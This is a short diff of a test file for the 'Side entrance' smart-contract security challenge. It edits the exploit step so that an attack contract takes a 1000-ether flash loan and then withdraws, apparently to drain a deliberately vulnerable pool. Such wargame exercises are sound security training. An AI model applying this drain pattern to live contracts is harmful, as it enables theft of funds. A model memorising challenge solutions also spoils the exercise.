@@ -28,7 +28,7 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        this.attack.executeFlashLoan('100')
+        this.attack.executeFlashLoan(ethers.utils.parseEther('1000'))
         this.attack.withdraw()
         
     });
